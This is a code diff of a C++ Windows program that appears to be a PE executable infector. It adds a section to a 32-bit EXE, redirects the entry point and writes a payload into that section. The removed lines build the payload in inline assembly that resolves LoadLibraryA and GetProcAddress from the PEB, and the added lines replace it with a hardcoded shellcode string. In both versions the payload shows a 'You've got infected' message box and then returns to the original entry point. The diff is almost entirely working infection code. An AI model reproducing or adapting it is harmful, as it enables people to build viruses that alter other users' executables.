@@ -1,9 +1,6 @@
 #include <windows.h>
-#include <imagehlp.h>
-#include <winternl.h>
 #include <stdio.h>
-#include <iostream>
-#pragma comment(lib, "imagehlp")
+#include <iostream>     
 
 using namespace std;
 
@@ -73,245 +70,70 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
     PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
     PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
 
-    SetFilePointer(hFile, 0, 0, FILE_BEGIN);
-    // Save the OEP
-    DWORD OEP = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
-
-    // Change the EP to point to the last section created
+    DWORD lastEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
     pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;
-    WriteFile(hFile, pByte, fileSize, &byteWritten, 0);
 
-    // Obtain the opcodes
-    DWORD start(0), end(0);
-    __asm {
-        mov eax, loc1
-        mov[start], eax
-        ; Jump over the second __asm without executing it in the infector itself
-        jmp over
-        loc1 :
-    }
-
-    __asm {
-        // Read the base address of kernel32.dll from PEB, walk it's export table (EAT) and search for functions
-        mov eax, fs: [30h]
-        mov eax, [eax + 0x0c]; 12
-        mov eax, [eax + 0x14]; 20
-        mov eax, [eax]
-        mov eax, [eax]
-        mov eax, [eax + 0x10]; 16
-
-        mov   ebx, eax; Take the base address of kernel32
-        mov   eax, [ebx + 0x3c]; PE header VMA
-        mov   edi, [ebx + eax + 0x78]; Export table relative offset
-        add   edi, ebx; Export table VMA
-        mov   ecx, [edi + 0x18]; Number of names
-
-        mov   edx, [edi + 0x20]; Names table relative offset
-        add   edx, ebx; Names table VMA
-        ; now lets look for a function named LoadLibraryA
-
-        LLA :
-            dec ecx
-            mov esi, [edx + ecx * 4]; Store the relative offset of the name
-            add esi, ebx; Set esi to the VMA of the current name
-            cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)
-            je LLALOOP1
-            LLALOOP1 :
-            cmp dword ptr[esi + 4], 0x7262694c
-            ; L(4c)i(69)b(62)r(72)
-            je LLALOOP2
-            LLALOOP2 :
-            cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)
-            je stop; if its = then jump to stop because we found it
-            jmp LLA; Load LibraryA
-        stop :
-            mov   edx, [edi + 0x24]; Table of ordinals relative
-            add   edx, ebx; Table of ordinals
-            mov   cx, [edx + 2 * ecx]; function ordinal
-            mov   edx, [edi + 0x1c]; Address table relative offset
-            add   edx, ebx; Table address
-            mov   eax, [edx + 4 * ecx]; ordinal offset
-            add   eax, ebx; Function VMA
-            ; EAX holds address of LoadLibraryA now
-
-
-            sub esp, 11
-            mov ebx, esp
-            mov byte ptr[ebx], 0x75; u
-            mov byte ptr[ebx + 1], 0x73; s
-            mov byte ptr[ebx + 2], 0x65; e
-            mov byte ptr[ebx + 3], 0x72; r
-            mov byte ptr[ebx + 4], 0x33; 3
-            mov byte ptr[ebx + 5], 0x32; 2
-            mov byte ptr[ebx + 6], 0x2e; .
-            mov byte ptr[ebx + 7], 0x64; d
-            mov byte ptr[ebx + 8], 0x6c; l
-            mov byte ptr[ebx + 9], 0x6c; l
-            mov byte ptr[ebx + 10], 0x0
-
-            push ebx
-
-            // Call LoadLibraryA with user32.dll as argument
-            call eax;
-            add esp, 11
-            // Save the return address of LoadLibraryA for later use in GetProcAddress
-            push eax
-
-            // Look again for a function named GetProcAddress
-            mov eax, fs: [30h]
-            mov eax, [eax + 0x0c]; 12
-            mov eax, [eax + 0x14]; 20
-            mov eax, [eax]
-            mov eax, [eax]
-            mov eax, [eax + 0x10]; 16
-
-            mov   ebx, eax; Take the base address of kernel32
-            mov   eax, [ebx + 0x3c]; PE header VMA
-            mov   edi, [ebx + eax + 0x78]; Export table relative offset
-            add   edi, ebx; Export table VMA
-            mov   ecx, [edi + 0x18]; Number of names
-
-            mov   edx, [edi + 0x20]; Names table relative offset
-            add   edx, ebx; Names table VMA
-        GPA :
-            dec ecx
-            mov esi, [edx + ecx * 4]; Store the relative offset of the name
-            add esi, ebx; Set esi to the VMA of the current name
-            cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)
-            je GPALOOP1
-            
-        GPALOOP1 :
-            cmp dword ptr[esi + 4], 0x41636f72
-            ; backwards remember : r(72)o(6f)c(63)A(41)
-            je GPALOOP2
-
-        GPALOOP2 :
-            cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)
-            ; no need to continue to look further cause there is no other function starting with GetProcAddre
-            je stp; if its = then jump to stop because we found it
-            jmp GPA
-
-        stp :
-            mov   edx, [edi + 0x24]; Table of ordinals relative
-            add   edx, ebx; Table of ordinals
-            mov   cx, [edx + 2 * ecx]; function ordinal
-            mov   edx, [edi + 0x1c]; Address table relative offset
-            add   edx, ebx; Table address
-            mov   eax, [edx + 4 * ecx]; ordinal offset
-            add   eax, ebx; Function VMA
-            ; EAX HOLDS THE ADDRESS OF GetProcAddress
-            mov esi, eax
-
-            sub esp, 12
-            mov ebx, esp
-            mov byte ptr[ebx], 0x4d      //M
-            mov byte ptr[ebx + 1], 0x65  //e
-            mov byte ptr[ebx + 2], 0x73  //s
-            mov byte ptr[ebx + 3], 0x73  //s
-            mov byte ptr[ebx + 4], 0x61  //a
-            mov byte ptr[ebx + 5], 0x67  //g
-            mov byte ptr[ebx + 6], 0x65  //e
-            mov byte ptr[ebx + 7], 0x42  //B
-            mov byte ptr[ebx + 8], 0x6f  //o
-            mov byte ptr[ebx + 9], 0x78  //x
-            mov byte ptr[ebx + 10], 0x41 //A
-            mov byte ptr[ebx + 11], 0x0
-
-            /*
-                Get back the value saved from LoadLibraryA return
-                So that the call to GetProcAddress is:
-                esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
-            */
-
-            mov eax, [esp + 12]
-            push ebx; MessageBoxA
-            push eax; base address of user32.dll retrieved by LoadLibraryA
-            call esi; GetProcAddress address
-            add esp, 12
-
-            sub esp, 21
-            mov ebx, esp
-            mov byte ptr[ebx], 89;      Y
-            mov byte ptr[ebx + 1], 111; o
-            mov byte ptr[ebx + 2], 117; u
-            mov byte ptr[ebx + 3], 39; `
-            mov byte ptr[ebx + 4], 118; v
-            mov byte ptr[ebx + 5], 101; e
-            mov byte ptr[ebx + 6], 32;
-            mov byte ptr[ebx + 7], 103; g
-            mov byte ptr[ebx + 8], 111; o
-            mov byte ptr[ebx + 9], 116; t
-            mov byte ptr[ebx + 10], 32;
-            mov byte ptr[ebx + 11], 105; i
-            mov byte ptr[ebx + 12], 110; n
-            mov byte ptr[ebx + 13], 102; f
-            mov byte ptr[ebx + 14], 101; e
-            mov byte ptr[ebx + 15], 99;  c
-            mov byte ptr[ebx + 16], 116; t
-            mov byte ptr[ebx + 17], 101; e
-            mov byte ptr[ebx + 18], 100; d
-            mov byte ptr[ebx + 19], 0
-
-            push 0
-            push 0
-            push ebx
-            push 0
-            call eax
-            add esp, 21
-
-            mov eax, 0xdeadbeef; Dummy original entry point
-            jmp eax
-    }
-
-    __asm {
-    over:
-        mov eax, loc2
-            mov[end], eax
-            loc2 :
-    }
-
-    byte address[1000];
-    byte* checkpoint = ((byte*)(start));
-    DWORD* invalidEP;
-    DWORD order = 0;
-
-    // Change 0xdeadbeef to address origin entry point with OEP
-    while (order < ((end - 11) - start)) {
-        invalidEP = ((DWORD*)((byte*)start + order));
-        if (*invalidEP == 0xdeadbeef) {
-            DWORD carrier;
-            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &carrier);
-            *invalidEP = OEP;
-        }
-        address[order] = checkpoint[order];
-        order++;
-    }
-
+    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
+    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);
-    WriteFile(hFile, address, order, &byteWritten, 0);
+
+    // shellcode
+    const char* shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
+                                "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
+                                "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
+                                "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
+                                "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
+                                "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
+                                "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
+                                "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
+                                "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
+                                "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
+                                "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
+                                "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
+                                "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
+                                "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
+                                "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
+                                "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89"
+                                "\xe3\x68\x74\x65\x64\x58\x68\x6e\x66\x65\x63\x68\x6f\x74"
+                                "\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6f\x75\x27\x31\xc9"
+                                "\x88\x4c\x24\x13\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0"
+                                "\x31\xc0\x50\x68";
+
+    DWORD shellcodeSize = strlen(shellcode1);
+    WriteFile(hFile, shellcode1, shellcodeSize, &byteWritten, NULL);
+    if (byteWritten != shellcodeSize) {
+        cout << "Error: Fail to write file" << endl;
+        return false;
+    }
+    // Get entry point and use liitle endian and change to hex
+    for (int i = 0; i < 4; i++) {
+        BYTE carrier = (BYTE)(lastEntryPoint >> (i * 8));
+        WriteFile(hFile, &carrier, 1, &byteWritten, NULL);
+    }
+    // Add \xc3 to the shellcode
+    const char* shellcode2 = "\xc3";
+    WriteFile(hFile, shellcode2, 1, &byteWritten, NULL);
+    if (byteWritten != 1) {
+        cout << " Error: Fail to write file " << endl;
+        return false;
+    }
+    CloseHandle(hFile);
     return true;
 }
 
-int main(int argc, char* argv[]) {
-
-    if (argc < 2) {
-        cout << "Usage: " << argv[0] << " <path\\of\\EXE\\file>" << endl;
-        return 1;
-    }
-
+bool OpenFile(const char* fileName) {
     // Open file and get information
-    HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE)
-    {
+    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
         cerr << "Error: Invalid file, try another one" << endl;
-        return 0;
+        return false;
     }
 
     DWORD fileSize = GetFileSize(hFile, NULL);
     if (!fileSize) {
         CloseHandle(hFile);
         cerr << "Error: File empty, try another one" << endl;
-        return 0;
+        return false;
     }
     // Buffer to allocate
     BYTE* pByte = new BYTE[fileSize];
@@ -326,29 +148,43 @@ int main(int argc, char* argv[]) {
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         CloseHandle(hFile);
         cerr << "Error: Invalid path or PE format" << endl;
-        return 0;
+        return false;
     }
 
     PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
     if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
         CloseHandle(hFile);
         cerr << "Error: PE32+ detected, this version works only with PE32" << endl;
-        return 0;
+        return false;
     }
 
     if (!CreateNewSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
         cerr << "Error: Fail to create new section" << endl;
-        return 0;
+        return false;
     }
 
     // Insert data into the last section
     if (!InflectSection(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
         cerr << "Error: Fail to infect Message Box" << endl;
-        return 0;
+        return false;
     }
 
-    cerr << "Success to infect Message Box into " << argv[1] << endl;
+    cerr << "Success to infect Message Box into " << fileName << endl;
 
     CloseHandle(hFile);
+    return true;
+}
+
+int main(int argc, char* argv[]) {
+
+    if (argc < 2) {
+        cout << "Usage: " << argv[0] << " <path\\of\\file>" << endl;
+        return 1;
+    }
+
+    if (!OpenFile(argv[1])) {
+        cerr << "Error: Invalid file path" << endl;
+    }
+
     return 0;
 }
